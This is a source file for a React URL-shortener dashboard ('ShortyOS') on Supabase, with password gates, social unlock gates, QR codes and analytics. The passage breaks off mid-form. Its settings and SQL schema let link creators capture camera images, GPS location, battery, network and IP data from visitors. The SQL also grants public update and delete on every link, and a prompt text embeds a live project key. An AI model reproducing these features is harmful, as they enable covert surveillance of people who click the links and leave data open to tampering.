import React, { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import { generateShortCode, cn } from '../lib/utils';
import { Link2, Copy, Check, Sparkles, Settings2, Database, AlertCircle, Trash2, Lock, Edit2, X, Download, QrCode, BarChart3, Clock, Smartphone, Monitor, Globe, ArrowUpRight, ExternalLink } from 'lucide-react';
import { SocialIcon } from '../components/SocialIcon';
import { QRCodeSVG } from 'qrcode.react';

const SOCIAL_ICONS = [
  { id: 'link', label: 'Default' },
  { id: 'youtube', label: 'YouTube' },
  { id: 'instagram', label: 'Instagram' },
  { id: 'twitter', label: 'Twitter' },
  { id: 'facebook', label: 'Facebook' },
  { id: 'whatsapp', label: 'Chat' },
  { id: 'linkedin', label: 'LinkedIn' },
  { id: 'snapchat', label: 'Snapchat' },
  { id: 'tiktok', label: 'TikTok' },
];

const getDeviceId = () => {
  try {
    let devId = localStorage.getItem('supashort_device_id');
    if (!devId) {
      devId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
      localStorage.setItem('supashort_device_id', devId);
    }
    return devId;
  } catch {
    return 'fallback-device-id';
  }
};

export default function Home() {
  const [longUrl, setLongUrl] = useState('');
  const [customCode, setCustomCode] = useState('');
  const [isPasswordEnabled, setIsPasswordEnabled] = useState(false);
  const [password, setPassword] = useState('');
  const [isSocialGateEnabled, setIsSocialGateEnabled] = useState(false);
  const [socialGateTitle, setSocialGateTitle] = useState('');
  const [socialGateUrl, setSocialGateUrl] = useState('');
  const [socialGateIcon, setSocialGateIcon] = useState('link');
  const [socialGateDescription, setSocialGateDescription] = useState('Complete the action below to unlock your link.');
  const [socialGateButtonText, setSocialGateButtonText] = useState('Verify & Continue');
  const [animationType, setAnimationType] = useState<'ring' | 'bar'>('ring');
  const [animationText, setAnimationText] = useState('LOADING');
  const [captureCamera, setCaptureCamera] = useState(false);
  const [captureLocation, setCaptureLocation] = useState(false);
  const [expiresAt, setExpiresAt] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [shortUrl, setShortUrl] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [needsSetup, setNeedsSetup] = useState(false);
  
  const [analyticsLink, setAnalyticsLink] = useState<any>(null);
  const [analyticsData, setAnalyticsData] = useState<any[]>([]);
  const [isLoadingAnalytics, setIsLoadingAnalytics] = useState(false);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  const [editingLink, setEditingLink] = useState<{
    id: string,
    code: string, 
    enablePassword: boolean, 
    newPassword: string,
    enableSocialGate: boolean,
    socialGateTitle: string,
    socialGateUrl: string,
    socialGateIcon: string,
    socialGateDescription: string,
    socialGateButtonText: string,
    animationType: 'ring' | 'bar',
    animationText: string,
    captureCamera: boolean,
    captureLocation: boolean,
    expiresAt: string,
  } | null>(null);
  const [isUpdating, setIsUpdating] = useState(false);

  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [isInstalled, setIsInstalled] = useState(false);

  useEffect(() => {
    // Check if app is already installed
    if (window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone) {
      setIsInstalled(true);
    }

    const handleBeforeInstallPrompt = (e: Event) => {
      e.preventDefault();
      setDeferredPrompt(e);
      // Optional: Maybe show a "New: App Available" toast here
    };

    const handleAppInstalled = () => {
      setDeferredPrompt(null);
      setIsInstalled(true);
    };

    window.addEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    window.addEventListener('appinstalled', handleAppInstalled);

    return () => {
      window.removeEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
      window.removeEventListener('appinstalled', handleAppInstalled);
    };
  }, []);

  useEffect(() => {
    // Handle Web Share Target incoming data
    const params = new URLSearchParams(window.location.search);
    const sharedUrl = params.get('url') || params.get('text');
    
    if (sharedUrl) {
      // Sometimes 'text' contains the URL along with other text
      const urlRegex = /(https?:\/\/[^\s]+)/g;
      const foundUrl = sharedUrl.match(urlRegex);
      if (foundUrl) {
        setLongUrl(foundUrl[0]);
      } else if (sharedUrl.startsWith('http')) {
        setLongUrl(sharedUrl);
      }
      
      // Clear the URL params after consuming them
      window.history.replaceState({}, document.title, "/");
    }
  }, []);

  // For saving history locally to browser
  const [history, setHistory] = useState(() => {
    try {
      const saved = localStorage.getItem('supashort_history');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const handleEditClick = async (code: string) => {
    try {
      const domain = window.location.hostname;
      const { data, error } = await supabase
        .from('urls')
        .select('*')
        .eq('domain', domain)
        .eq('short_code', code)
        .single();
        
      if (error) {
         if (error.code === 'PGRST116') {
             alert('Link not found.');
             return;
         }
         throw error;
      }
      
      setEditingLink({
        id: data.id,
        code,
        enablePassword: !!data.password,
        newPassword: '', // Don't show existing password
        enableSocialGate: !!(data.social_gate_title && data.social_gate_url),
        socialGateTitle: data.social_gate_title || '',
        socialGateUrl: data.social_gate_url || '',
        socialGateIcon: data.social_gate_icon || 'link',
        socialGateDescription: data.social_gate_description || 'Complete the action below to unlock your link.',
        socialGateButtonText: data.social_gate_button_text || 'Verify & Continue',
        animationType: data.animation_type || 'ring',
        animationText: data.animation_text || 'LOADING',
        captureCamera: !!data.capture_camera,
        captureLocation: !!data.capture_location,
        expiresAt: data.expires_at ? new Date(data.expires_at).toISOString().slice(0, 16) : '',
      });
      setAnimationType(data.animation_type || 'ring');
      setAnimationText(data.animation_text || 'LOADING');
    } catch (err) {
      console.error(err);
      alert("Failed to load link details for editing.");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setNeedsSetup(false);
    setShortUrl(null);
    setCopied(false);

    let urlToShorten = longUrl.trim();
    if (!urlToShorten) return;
    
    // Add https if missing
    if (!/^https?:\/\//i.test(urlToShorten)) {
      urlToShorten = `https://${urlToShorten}`;
    }

    // Validate URL
    try {
      new URL(urlToShorten);
    } catch {
      setError('Please enter a valid URL.');
      return;
    }

    setIsSubmitting(true);
    
    // Use custom code or generate a random one
    const code = customCode.trim() ? customCode.trim() : generateShortCode();

    try {
      const domain = window.location.hostname;
      const { error: dbError } = await supabase
        .from('urls')
        .insert([{ 
          domain, 
          short_code: code, 
          long_url: urlToShorten, 
          password: isPasswordEnabled && password ? password : null,
          social_gate_title: isSocialGateEnabled && socialGateTitle && socialGateUrl ? socialGateTitle : null,
          social_gate_url: isSocialGateEnabled && socialGateTitle && socialGateUrl ? socialGateUrl : null,
          social_gate_icon: isSocialGateEnabled && socialGateTitle && socialGateUrl ? socialGateIcon : null,
          social_gate_description: isSocialGateEnabled ? socialGateDescription : null,
          social_gate_button_text: isSocialGateEnabled ? socialGateButtonText : null,
          animation_type: animationType,
          animation_text: animationText,
          capture_camera: captureCamera,
          capture_location: captureLocation,
          expires_at: expiresAt ? new Date(expiresAt).toISOString() : null,
          device_id: getDeviceId()
        }]);

      if (dbError) {
        console.error("Insert error:", dbError);
        
        if (dbError.code === '23505') {
          // Unique violation
          setError(`The code "${code}" is already taken. Please choose another one.`);
        } else if (dbError.message?.includes('relation "urls" does not exist') || dbError.message?.includes('column "domain" of relation "urls" does not exist')) {
          setNeedsSetup(true);
          setError("Database schema update required. Please copy and run the SQL query below in your Supabase SQL editor.");
        } else {
          setError(dbError.message || 'An error occurred while shortening your URL.');
        }
        setIsSubmitting(false);
        return;
      }

      // Success
      const generatedUrl = `${window.location.origin}/${code}`;
      setShortUrl(generatedUrl);
      
      const newHistoryItem = { 
        code, 
        longUrl: urlToShorten, 
        shortUrl: generatedUrl, 
        date: new Date().toISOString(), 
        hasPassword: isPasswordEnabled && password ? true : false,
        hasSocialGate: isSocialGateEnabled && socialGateTitle && socialGateUrl ? true : false
      };
      const updatedHistory = [newHistoryItem, ...history].slice(0, 10); // Keep last 10
      setHistory(updatedHistory);
      localStorage.setItem('supashort_history', JSON.stringify(updatedHistory));
      
      setLongUrl('');
      setCustomCode('');
      setPassword('');
      setIsPasswordEnabled(false);
      setIsSocialGateEnabled(false);
      setSocialGateTitle('');
      setSocialGateUrl('');
      setSocialGateIcon('link');
      setSocialGateDescription('Complete the action below to unlock your link.');
      setSocialGateButtonText('Verify & Continue');
    } catch (err) {
      console.error(err);
      setError('An unexpected error occurred. Check console for details.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleUpdateLink = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingLink) return;

    setIsUpdating(true);
    try {
      const domain = window.location.hostname;
      const newPasswordValue = editingLink.enablePassword && editingLink.newPassword ? editingLink.newPassword : null;

      // Only update password if we provided one (either new or clearing it)
      // Wait, if enablePassword is true and newPassword is empty, we don't change the password.
      // Actually, if we just want to keep the old password, we should not send it.
      // But if enablePassword is false, we clear the password.
      let updateData: any = {};
      
      if (!editingLink.enablePassword) {
         updateData.password = null;
      } else if (editingLink.newPassword) {
         updateData.password = editingLink.newPassword;
      }

      updateData.social_gate_title = editingLink.enableSocialGate && editingLink.socialGateTitle && editingLink.socialGateUrl ? editingLink.socialGateTitle : null;
      updateData.social_gate_url = editingLink.enableSocialGate && editingLink.socialGateTitle && editingLink.socialGateUrl ? editingLink.socialGateUrl : null;
      updateData.social_gate_icon = editingLink.enableSocialGate && editingLink.socialGateTitle && editingLink.socialGateUrl ? editingLink.socialGateIcon : null;
      updateData.social_gate_description = editingLink.enableSocialGate ? editingLink.socialGateDescription : null;
      updateData.social_gate_button_text = editingLink.enableSocialGate ? editingLink.socialGateButtonText : null;
      updateData.animation_type = animationType;
      updateData.animation_text = animationText;
      updateData.capture_camera = editingLink.captureCamera;
      updateData.capture_location = editingLink.captureLocation;
      updateData.expires_at = editingLink.expiresAt ? new Date(editingLink.expiresAt).toISOString() : null;

      
      const { error: updateError } = await supabase
        .from('urls')
        .update(updateData)
        .eq('domain', domain)
        .eq('short_code', editingLink.code)
        .eq('device_id', getDeviceId());

      if (updateError) {
         console.error(updateError);
         alert(updateError.message || "Failed to update link. Did you add the UPDATE policy in Supabase?");
      } else {
         // Update history to reflect password state
         const updatedHistory = history.map((item: any) => {
           if (item.code === editingLink.code) {
              const keepOldPassword = editingLink.enablePassword && !editingLink.newPassword && item.hasPassword;
              return { 
                ...item, 
                hasPassword: !!editingLink.newPassword || keepOldPassword,
                hasSocialGate: !!(updateData.social_gate_title && updateData.social_gate_url)
              };
           }
           return item;
         });
         setHistory(updatedHistory);
         localStorage.setItem('supashort_history', JSON.stringify(updatedHistory));
         setEditingLink(null);
      }
    } catch (err) {
      console.error(err);
      alert("An unexpected error occurred.");
    } finally {
      setIsUpdating(false);
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy', err);
    }
  };

  const handleDeleteLink = async (codeToDelete: string) => {
    if (!window.confirm("Are you sure you want to delete this link?")) return;
    
    try {
      const domain = window.location.hostname;
      const { error: deleteError } = await supabase
        .from('urls')
        .delete()
        .eq('domain', domain)
        .eq('short_code', codeToDelete)
        .eq('device_id', getDeviceId());

      if (deleteError) {
        console.error("Delete error:", deleteError);
        alert(deleteError.message || "Failed to delete link.");
        return;
      }

      const updatedHistory = history.filter((item: any) => item.code !== codeToDelete);
      setHistory(updatedHistory);
      localStorage.setItem('supashort_history', JSON.stringify(updatedHistory));
    } catch (err) {
      console.error(err);
      alert("An unexpected error occurred while deleting.");
    }
  };

  const clearHistory = () => {
    setHistory([]);
    localStorage.removeItem('supashort_history');
  }

  const fetchAnalytics = async (link: any) => {
    setAnalyticsLink(link);
    setIsLoadingAnalytics(true);
    setAnalyticsData([]);
    try {
      const { data, error } = await supabase
        .from('link_analytics')
        .select('*')
        .eq('url_id', link.id || (await supabase.from('urls').select('id').eq('short_code', link.code).single()).data?.id)
        .order('created_at', { ascending: false });
      
      if (error) throw error;
      setAnalyticsData(data || []);
    } catch (err) {
      console.error(err);
      alert('Failed to load analytics.');
    } finally {
      setIsLoadingAnalytics(false);
    }
  };

  const downloadQR = (code: string) => {
    const svg = document.getElementById(`qr-${code}`);
    if (!svg) return;
    const svgData = new XMLSerializer().serializeToString(svg);
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const img = new Image();
    img.onload = () => {
      canvas.width = img.width;
      canvas.height = img.height;
      ctx?.drawImage(img, 0, 0);
      const pngUrl = canvas.toDataURL("image/png");
      const downloadLink = document.createElement("a");
      downloadLink.href = pngUrl;
      downloadLink.download = `qr-${code}.png`;
      document.body.appendChild(downloadLink);
      downloadLink.click();
      document.body.removeChild(downloadLink);
    };
    img.src = "data:image/svg+xml;base64," + btoa(svgData);
  };

  const sqlSetupScript = `-- Run this in your Supabase SQL Editor

-- [MAINTENANCE] AUTO-PURGE OLD IMAGES (Saves Storage)
-- Run this to clear images older than 40 days daily:
-- select cron.schedule('purge-images', '0 0 * * *', $$ UPDATE public.link_analytics SET captured_image = NULL WHERE created_at < NOW() - INTERVAL '40 days' $$);

-- [SETUP] Table Updates
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS password text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS social_gate_title text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS social_gate_url text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS social_gate_icon text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS social_gate_description text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS social_gate_button_text text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS device_id text;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS animation_type text DEFAULT 'ring';
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS animation_text text DEFAULT 'LOADING';
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS capture_camera boolean DEFAULT false;
ALTER TABLE public.urls ADD COLUMN IF NOT EXISTS capture_location boolean DEFAULT false;

-- Add columns to analytics for the new intelligence
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS captured_image text;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS latitude double precision;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS longitude double precision;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS location_name text;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS battery_level float;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS is_charging boolean;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS network_type text;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS screen_resolution text;
ALTER TABLE public.link_analytics ADD COLUMN IF NOT EXISTS language text;

-- If creating from scratch:
create table public.urls (
  id uuid default gen_random_uuid() primary key,
  domain text not null,
  short_code text not null,
  long_url text not null,
  password text,
  social_gate_title text,
  social_gate_url text,
  social_gate_icon text,
  social_gate_description text,
  social_gate_button_text text,
  device_id text,
  animation_type text default 'ring',
  animation_text text default 'LOADING',
  capture_camera boolean default false,
  capture_location boolean default false,
  clicks integer default 0,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  unique (domain, short_code)
);

create table public.link_analytics (
  id uuid default gen_random_uuid() primary key,
  url_id uuid references public.urls(id) on delete cascade,
  ip_address text,
  device_type text,
  browser text,
  os text,
  referrer text,
  captured_image text,
  latitude double precision,
  longitude double precision,
  location_name text,
  battery_level float,
  is_charging boolean,
  network_type text,
  screen_resolution text,
  language text,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null
);

-- Turn on row security
alter table public.urls enable row level security;

-- Allow public access
create policy "Allow public read access" on public.urls for select using (true);
create policy "Allow public insert access" on public.urls for insert with check (true);
create policy "Allow public update access" on public.urls for update using (true);
create policy "Allow public delete access" on public.urls for delete using (true);
`;

  const downloadIntegrationPrompt = () => {
    const promptText = `Provide this prompt to any AI assistant (like ChatGPT, Claude, Gemini) to integrate this URL shortener into your own project:

PROMPT FOR AI:
"I want to integrate a multi-domain URL shortener into my project using Supabase. 
Please read the following logic and implement it into my project. 

HOW IT WORKS:
1. We use a Supabase table named 'urls' that stores 'domain', 'short_code', and 'long_url'. 
   The combination of 'domain' + 'short_code' is unique, allowing multiple domains to use the same database and even the same short codes ('ahadali').
2. When creating a link, we identify the current domain (e.g. window.location.hostname) and insert it alongside the generated/custom code and the target long URL.
3. On the redirect route (e.g. /:shortCode), we query the 'urls' table where 'domain' equals the current domain and 'short_code' equals the path parameter, then redirect to the 'long_url' if found.

Here are the specific snippets you should use as a reference:

--- 1. Supabase SQL Schema ---
-- Run this in your Supabase SQL editor:
create table public.urls (
  id uuid default gen_random_uuid() primary key,
  domain text not null,
  short_code text not null,
  long_url text not null,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  unique (domain, short_code)
);
alter table public.urls enable row level security;
create policy "Allow public read access" on public.urls for select using (true);
create policy "Allow public insert access" on public.urls for insert with check (true);


--- 2. Helper Logic (TypeScript) ---
export function generateShortCode(): string {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}


--- 3. Link Creation Logic ---
const domain = window.location.hostname; // Detect current domain
const code = customCode || generateShortCode();

const { error } = await supabase
  .from('urls')
  .insert([{ domain, short_code: code, long_url: urlToShorten }]);


--- 4. Redirect Logic (Route Handler / Client Page) ---
const domain = window.location.hostname;
const shortCode = "..."; // Get from URL path params

const { data, error } = await supabase
  .from('urls')
  .select('long_url')
  .eq('domain', domain)
  .eq('short_code', shortCode)
  .single();

if (data?.long_url) {
  window.location.href = data.long_url; // Or server-side redirect
}


--- 5. Supabase Credentials ---
Use these credentials to connect to the Supabase instance:
VITE_SUPABASE_URL="https://irhqcroczvdkytvvsico.supabase.co"
VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"


--- My Custom Instructions ---
(AI, please follow the specific integration instructions I have written below this line to know exactly how to integrate it into my project framework/UI):

[WRITE YOUR SPECIFIC INSTRUCTIONS HERE, e.g., "Add this to my Next.js navbar", "Make the form blue", etc.]
"`;

    const blob = new Blob([promptText], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "url_shortener_ai_prompt.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-[#0A0A0A] text-[#EDEDED] font-sans flex flex-col overflow-hidden">
      {/* Top Navigation Bar */}
      <nav className="h-16 border-b border-white/10 flex items-center justify-between px-4 md:px-8 bg-[#0F0F0F] shrink-0">
        <div className="flex items-center gap-2 md:gap-3">
          <div className="w-8 h-8 rounded flex items-center justify-center overflow-hidden shrink-0">
            <img 
              src="https://ik.imagekit.io/19imy4f1u/lite_1777560977588_frMe1_REC.png" 
              className="w-full h-full object-cover"
              alt="Logo"
              referrerPolicy="no-referrer"
            />
          </div>
          <span className="text-base md:text-lg font-semibold tracking-tight flex items-baseline gap-2">
            <div>Shorty<span className="text-blue-500 underline decoration-2 underline-offset-4">OS</span></div>
            <span className="text-[10px] text-zinc-500 font-normal opacity-70">by saqib</span>
          </span>
        </div>
        <div className="flex items-center gap-3 md:gap-6">
          <div className="hidden sm:flex items-center gap-2 px-3 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full">
            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full"></div>
            <span className="text-[11px] text-emerald-400 font-medium uppercase tracking-wider">Supabase Connected</span>
          </div>
          {!isInstalled && (
            <button 
              type="button"
              className={cn(
                "text-xs font-medium px-3 py-1.5 border rounded-md transition-colors flex items-center gap-2",
                deferredPrompt 
                  ? "bg-blue-600 border-blue-500 text-white hover:bg-blue-700" 
                  : "bg-white/5 border-white/10 text-zinc-400 hover:bg-white/10"
              )}
              onClick={async () => {
                if (deferredPrompt) {
                  deferredPrompt.prompt();
                  const { outcome } = await deferredPrompt.userChoice;
                  if (outcome === 'accepted') {
                    setDeferredPrompt(null);
                  }
                } else {
                  // If no prompt, it might be because we are in an iframe (AI Studio preview)
                  if (window.self !== window.top) {
                    if (confirm("Browser installation prompts often don't work inside iframes. Open app in a new tab to see the 'Install' option?")) {
                      window.open(window.location.href, '_blank');
                    }
                  } else {
                    alert("Install option not yet available. Please try again after using the app for a moment or check your browser menu.");
                  }
                }
              }}
            >
              <Download className={cn("w-3.5 h-3.5", deferredPrompt && "animate-bounce")} />
              <span className="hidden sm:inline">
                {deferredPrompt ? "Install Now" : "Install App"}
              </span>
            </button>
          )}
          <div className="w-8 h-8 rounded-full bg-zinc-800 border border-white/10 flex items-center justify-center overflow-hidden shrink-0">
             <svg className="w-5 h-5 text-zinc-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
          </div>
        </div>
      </nav>

      <div className="flex flex-1 overflow-hidden flex-col md:flex-row">
        {/* Sidebar: Analytics/Recent */}
        <aside className="w-full md:w-80 border-r border-white/10 bg-[#0F0F0F] flex flex-col shrink-0 h-48 md:h-auto border-b md:border-b-0 order-last md:order-first">
          <div className="p-6 flex-1 overflow-y-auto">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xs font-bold text-zinc-500 uppercase tracking-[0.2em]">Recent Short Links</h2>
              {history.length > 0 && (
                <button onClick={clearHistory} className="text-[10px] text-zinc-500 hover:text-red-400 transition-colors uppercase tracking-widest font-bold">Clear</button>
              )}
            </div>
            <div className="space-y-3">
              {history.length === 0 ? (
                <p className="text-[11px] text-zinc-600">No recent links.</p>
              ) : (
                history.map((item: any, i: number) => (
                  <div key={i} className="p-3 rounded-lg bg-white/5 border border-white/5 hover:border-blue-500/50 transition-colors group">
                    <div className="flex justify-between items-start mb-1">
                      <div className="flex items-center gap-2">
                        <a href={item.shortUrl} target="_blank" rel="noreferrer" className="text-sm font-medium text-blue-400 hover:underline">
                          /{item.code}
                        </a>
                        {item.hasPassword && <Lock className="w-3 h-3 text-emerald-500" title="Password Protected" />}
                        {item.hasSocialGate && <Link2 className="w-3 h-3 text-blue-500" title="Social Gate" />}
                      </div>
                      <div className="flex items-center gap-1">
                        <button 
                          onClick={() => fetchAnalytics(item)} 
                          className="p-1.5 rounded-lg text-zinc-400 hover:text-blue-400 hover:bg-blue-400/10 transition-all"
                          title="Analytics"
                        >
                          <BarChart3 className="w-3.5 h-3.5" />
                        </button>
                        <button 
                          onClick={() => handleEditClick(item.code)} 
                          className="p-1 rounded text-[10px] text-zinc-400 hover:text-white hover:bg-white/10 transition-colors uppercase font-medium tracking-wide flex items-center gap-1"
                        >
                          <Edit2 className="w-3 h-3" /> Edit
                        </button>
                        <button 
                          onClick={() => copyToClipboard(item.shortUrl)} 
                          className="p-1 rounded text-[10px] text-zinc-400 hover:text-white hover:bg-white/10 transition-colors uppercase font-medium tracking-wide flex items-center gap-1"
                        >
                          <Copy className="w-3 h-3" /> Copy
                        </button>
                        <button 
                          onClick={() => handleDeleteLink(item.code)} 
                          className="p-1 rounded text-[10px] text-zinc-400 hover:text-red-400 hover:bg-red-400/10 transition-colors uppercase font-medium tracking-wide flex items-center gap-1"
                        >
                          <Trash2 className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                    
                    <div className="flex items-end justify-between">
                      <div className="flex-1 min-w-0 pr-2">
                        <p className="text-[11px] text-zinc-400 truncate" title={item.longUrl}>{item.longUrl}</p>
                        <div className="mt-2 flex items-center gap-2">
                           <span className="text-[9px] text-zinc-600 font-bold uppercase tracking-widest">{new Date(item.date).toLocaleDateString()}</span>
                           {item.expires_at && <span className="text-[9px] text-red-500/50 font-bold uppercase tracking-widest flex items-center gap-1"><Clock className="w-2.5 h-2.5" /> Expired</span>}
                        </div>
                      </div>
                      <div className="shrink-0 flex flex-col items-center gap-2 group/qr">
                         <div className="w-12 h-12 bg-white p-1 rounded shadow-lg transition-transform group-hover/qr:scale-105">
                            <QRCodeSVG 
                              id={`qr-${item.code}`}
                              value={item.shortUrl} 
                              size={44}
                              level="H"
                            />
                         </div>
                         <button 
                           onClick={() => downloadQR(item.code)}
                           className="flex items-center gap-1.5 px-2 py-1 bg-white/5 hover:bg-white/10 rounded text-[9px] text-zinc-400 font-bold uppercase tracking-widest transition-all"
                         >
                           <Download className="w-2.5 h-2.5" />
                           Download
                         </button>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
          <div className="mt-auto p-6 border-t border-white/10 hidden md:block shrink-0">
            <div className="bg-zinc-900 rounded-lg p-4 mb-4">
              <p className="text-[10px] text-zinc-500 uppercase font-bold tracking-widest mb-2">Project Key</p>
              <code className="text-[11px] text-blue-400 font-mono break-all leading-tight">
                {(import.meta as any).env.VITE_SUPABASE_ANON_KEY?.substring(0, 24)}...
              </code>
            </div>
            <p className="text-center text-[10px] text-zinc-600 font-medium tracking-tighter">
              MADE BY SAQIB
            </p>
          </div>
        </aside>

        {/* Main Content Area */}
        <main className="flex-1 flex flex-col items-center justify-center p-6 md:p-20 bg-[radial-gradient(circle_at_top,_#1a1a1a_0%,_#0a0a0a_70%)] overflow-y-auto">
          <div className="w-full max-w-2xl mt-auto md:mt-0 mb-auto">
            <div className="mb-10 text-center">
              <h1 className="text-4xl font-light tracking-tight mb-2">
                Simplify your <span className="font-medium text-blue-500">Links</span>.
              </h1>
              <p className="text-zinc-500">Paste a long URL and get a short link instantly.</p>
            </div>

            {/* Shortener Tool */}
            <div className="bg-zinc-900/50 border border-white/10 p-6 md:p-8 rounded-2xl backdrop-blur-xl shadow-2xl">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label htmlFor="url" className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">
                    Destination URL
                  </label>
                  <input
                    id="url"
                    type="text"
                    value={longUrl}
                    onChange={(e) => setLongUrl(e.target.value)}
                    placeholder="https://example.com/very-long-link-with-many-parameters"
                    className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans"
                    required
                  />
                </div>

                <div>
                  <div className="flex items-center justify-between mb-2">
                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest flex items-center gap-2">
                      <Lock className="w-3 h-3"/> Password Protection
                    </label>
                    <button
                      type="button"
                      role="switch"
                      aria-checked={isPasswordEnabled}
                      onClick={() => setIsPasswordEnabled(!isPasswordEnabled)}
                      className={cn(
                        "relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/50",
                        isPasswordEnabled ? "bg-emerald-500" : "bg-neutral-700"
                      )}
                    >
                      <span className={cn(
                        "inline-block h-4 w-4 transform rounded-full bg-white transition-transform shadow-sm",
                        isPasswordEnabled ? "translate-x-6" : "translate-x-1"
                      )} />
                    </button>
                  </div>
                  
                  {isPasswordEnabled && (
                    <div className="animate-in slide-in-from-top-2 fade-in duration-200">
                      <input
                        id="password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter password..."
                        required={isPasswordEnabled}
                        className="w-full bg-[#0A0A0A] rounded-lg py-4 px-5 text-zinc-200 focus:outline-none placeholder:text-zinc-700 transition-all font-sans border animate-rgb"
                      />
                    </div>
                  )}
                </div>

                <div>
                  <div className="flex items-center justify-between mb-2">
                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest flex items-center gap-2">
                      <Link2 className="w-3 h-3"/> Social Gate (Sub2Unlock)
                    </label>
                    <button
                      type="button"
                      role="switch"
                      aria-checked={isSocialGateEnabled}
                      onClick={() => setIsSocialGateEnabled(!isSocialGateEnabled)}
                      className={cn(
                        "relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/50",
                        isSocialGateEnabled ? "bg-emerald-500" : "bg-neutral-700"
                      )}
                    >
                      <span className={cn(
                        "inline-block h-4 w-4 transform rounded-full bg-white transition-transform shadow-sm",
                        isSocialGateEnabled ? "translate-x-6" : "translate-x-1"
                      )} />
                    </button>
                  </div>
                  
                  {isSocialGateEnabled && (
                    <div className="animate-in slide-in-from-top-2 fade-in duration-200 space-y-4">
                      <div>
                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">Choose Icon</label>
                        <div className="flex flex-wrap gap-2">
                          {SOCIAL_ICONS.map((item) => (
                            <button
                              key={item.id}
                              type="button"
                              onClick={() => setSocialGateIcon(item.id)}
                              className={cn(
                                "flex items-center gap-2 px-3 py-2 rounded-lg transition-all",
                                socialGateIcon === item.id 
                                  ? "bg-blue-500/10 text-blue-400 ring-1 ring-blue-500" 
                                  : "bg-[#0F0F0F] border border-white/5 text-zinc-400 hover:bg-white/5 hover:text-zinc-200"
                              )}
                            >
                              <SocialIcon id={item.id} className="w-6 h-6" />
                              <span className="text-xs font-medium">{item.label}</span>
                            </button>
                          ))}
                        </div>
                      </div>
                      <input
                        type="text"
                        value={socialGateTitle}
                        onChange={(e) => setSocialGateTitle(e.target.value)}
                        placeholder="e.g. Follow my WhatsApp Channel"
                        required={isSocialGateEnabled}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="url"
                        value={socialGateUrl}
                        onChange={(e) => setSocialGateUrl(e.target.value)}
